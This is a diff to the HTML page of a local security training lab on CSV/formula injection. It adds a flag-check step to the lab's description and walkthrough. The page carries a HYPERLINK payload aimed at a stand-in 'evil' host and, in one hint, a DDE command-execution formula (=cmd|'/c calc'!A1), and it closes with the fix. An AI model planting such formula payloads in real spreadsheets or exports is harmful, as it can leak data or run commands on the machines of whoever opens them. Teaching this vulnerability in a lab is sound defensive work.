@@ -37,7 +37,7 @@
     <span class="labs-port mono">localhost:5032</span>
   </div>
   <h1 class="h1-page" style="margin-top:14px;">CSV / formula injection</h1>
-  <p class="lead" style="margin-top:12px;">/feedback stores a message; /export streams all messages as CSV with no neutralization. A message beginning with = + - or @ becomes an executable formula when the CSV is opened in Excel/Sheets (data exfil or command execution via DDE). In Nullock: 1. nullock scope add http://localhost:5032/* 2. POST /feedback  msg==HYPERLINK(&quot;http://evil&quot;,&quot;click&quot;) 3. GET /export -- the cell starts with &#x27;=&#x27; (live formula on open). Fix: prefix risky leading chars (= + - @ tab CR) with a single quote, or quote the field, when exporting user-controlled data to CSV.</p>
+  <p class="lead" style="margin-top:12px;">/feedback stores a message; /export streams all messages as CSV with no neutralization. A message beginning with = + - or @ becomes an executable formula when the CSV is opened in Excel/Sheets (data exfil or command execution via DDE). In Nullock: 1. nullock scope add http://localhost:5032/* 2. POST /feedback  msg==HYPERLINK(&quot;http://evil&quot;,&quot;click&quot;) 3. GET /export -- the cell starts with &#x27;=&#x27; (live formula on open). 4. Confirm success: GET /flag -- solved only once /export was actually called while an unneutralized formula-leading message was stored, proving the raw formula reached the exported CSV cell. Fix: prefix risky leading chars (= + - @ tab CR) with a single quote, or quote the field, when exporting user-controlled data to CSV.</p>
 
   <div class="code" style="margin-top:26px;">
     <div class="code-head"><span class="mono">start the lab</span></div>
@@ -51,7 +51,7 @@ python labs/32-csv-injection/app.py
   <h2 class="h2-section" style="margin-top:40px;font-size:22px;">Hints</h2><p class="muted" style="font-size:13px;margin:8px 0 14px;">Stuck? Open these one at a time -- each reveals a bit more than the last.</p><div class="labs-hints"><details class="labs-hint"><summary>Hint 1</summary><p>Find a feature that exports user-supplied data as a CSV/spreadsheet download.</p></details><details class="labs-hint"><summary>Hint 2</summary><p>What happens if one of your saved fields starts with =, +, -, or @?</p></details><details class="labs-hint"><summary>Hint 3</summary><p>A field like =cmd|&#x27;/c calc&#x27;!A1 surviving unescaped into the export can trigger formula execution when the victim opens it.</p></details></div>
 
   <h2 class="h2-section" style="margin-top:40px;font-size:22px;">Walkthrough</h2>
-  <ol class="labs-steps"><li>nullock scope add http://localhost:5032/*</li><li>POST /feedback  msg==HYPERLINK(&quot;http://evil&quot;,&quot;click&quot;)</li><li>GET /export -- the cell starts with &#x27;=&#x27; (live formula on open).</li></ol>
+  <ol class="labs-steps"><li>nullock scope add http://localhost:5032/*</li><li>POST /feedback  msg==HYPERLINK(&quot;http://evil&quot;,&quot;click&quot;)</li><li>GET /export -- the cell starts with &#x27;=&#x27; (live formula on open).</li><li>Confirm success: GET /flag -- solved only once /export was actually called while an unneutralized formula-leading message was stored, proving the raw formula reached the exported CSV cell.</li></ol>
 
   <div class="labs-fix"><div class="mono labs-fix-h">the fix</div><p>Fix: prefix risky leading chars (= + - @ tab CR) with a single quote, or quote the field, when exporting user-controlled data to CSV.</p></div>
 
